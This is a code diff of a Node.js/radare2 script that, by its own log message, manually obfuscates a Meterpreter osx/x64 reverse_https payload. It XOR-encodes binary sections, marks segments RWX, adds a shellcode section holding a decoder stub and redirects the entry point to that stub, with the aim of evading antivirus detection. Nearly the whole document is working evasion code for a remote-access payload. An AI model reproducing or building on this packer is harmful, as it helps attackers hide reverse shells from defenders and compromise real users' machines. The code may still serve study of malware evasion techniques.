@@ -5,16 +5,12 @@ const execFileSync = require('child_process').execFileSync
 
 const XOR_KEY = 0xf
 
-function calculate_jmp_back(entry_point) {
-  return '0x' + (parseInt(entry_point, 16) + 6).toString(16) // TODO: patch back original bytes and jmp at entry point
-}
-
 async function find_entry_point(r2) {
   return await r2.cmd('s')
 }
 
-async function find_entry_point_instructions(r2) {
-  return await r2.cmdj('pdj 3')
+async function find_entry_point_bytes(r2) {
+  return (await r2.cmd('pxq 8')).split(' ')[2] // TODO: x86 bits
 }
 
 async function find_code_cave(r2, sections_to_xor) {
@@ -67,13 +63,13 @@ async function xor_sections(r2, sections, key = XOR_KEY) {
   }
 }
 
-function create_stub(jmp_back, sections, original_instructions, xor_key = XOR_KEY) {
+function create_stub(sections, entry_point, entry_point_bytes, xor_key = XOR_KEY) {
   const template = fs.readFileSync('templates/stub.asm.mustache', { encoding: 'utf-8' })
   const data = {
     sections,
-    original_instructions,
+    entry_point,
+    entry_point_bytes,
     xor_key,
-    jmp_back,
   }
 
   const instance = mustache.render(template, data)
@@ -86,13 +82,13 @@ function get_page_start(addr) {
 
 async function find_sections(r2) {
   const WHITELIST = [
-    //'0.__TEXT.__text',
-    '3.__TEXT.__cstring',
-    //'23.__DATA.__data'
+    //'__TEXT.__text',
+    //'__TEXT.__cstring',
+    '__DATA.__data'
   ]
 
   const sections = (await r2.cmdj('iSj'))
-    .filter(s => WHITELIST.includes(s.name))
+    .filter(s => WHITELIST.some(w => s.name.includes(w)))
     .map(s => ({
       ...s,
       page_start: get_page_start(s.vaddr),
@@ -106,7 +102,7 @@ async function patch_entry_point(r2, entry_point, code_cave) {
   console.log(await r2.cmd(`?E Patching entry point`))
   await r2.cmd(`s ${entry_point}`)
   console.log(`original entry point:\n${await r2.cmd('pd 5')}`)
-  await r2.cmd(`"wa jmp ${code_cave}; nop"`)
+  await r2.cmd(`"wa jmp ${code_cave}"`)
   console.log(`new entry point:\n${await r2.cmd('pd 5')}`)
 }
 
@@ -123,24 +119,41 @@ async function remove_pie(r2, file) {
   console.log(execFileSync('python',  ['deps/disable_aslr/disable_aslr.py', file], { encoding: 'utf-8' }))
 }
 
+function make_rwx_and_add_section(file) {
+  //console.log(await r2.cmd(`?E Making all rwx, adding new section and disabling PIE - ${file}`))
+  console.log(execFileSync('python3',  ['scripts/make-all-rwx-and-add-section.py', file], { encoding: 'utf-8' }))
+}
+
+async function find_shellcode_section(r2) {
+  const shellcode_section = (await r2.cmdj('iSj')).find(x => x.name.includes('__TEXT.__shellcode'))
+
+  if (!shellcode_section) {
+    throw new Error('Cannot find __TEXT.__shellcode section')
+  }
+
+  return '0x' + shellcode_section.vaddr.toString(16)
+}
+
 async function main(file) {
   try {
+    make_rwx_and_add_section(file)
     const r2 = await r2promise.open(file, ['-w'])
     console.log(await r2.cmd(`?E Meterpreter osx/x64/meterpreter_reverse_https manual ofbuscation - ${file}`))
     const entry_point = await find_entry_point(r2)
-    const jmp_back = calculate_jmp_back(entry_point)
     const sections = await find_sections(r2)
-    const code_cave = await find_code_cave(r2, sections)
-    const entry_point_instructions = await find_entry_point_instructions(r2)
-    create_stub(jmp_back, sections, entry_point_instructions)
+    //const code_cave = await find_code_cave(r2, sections)
+    const shellcode_section = await find_shellcode_section(r2)
+    const entry_point_bytes = await find_entry_point_bytes(r2)
+    create_stub(sections, entry_point, entry_point_bytes)
     await xor_sections(r2, sections)
-    await patch_entry_point(r2, entry_point, code_cave)
-    await patch_code_cave(r2, code_cave)
-    await remove_pie(r2, file)
+    await patch_entry_point(r2, entry_point, shellcode_section)
+    await patch_code_cave(r2, shellcode_section)
+    //await remove_pie(r2, file)
     console.log(await r2.cmd(`?E Done! Check ${file}`))
     return r2.quit()
   } catch (err) {
     console.error(err)
+    process.exit(-1)
   }
 }
 
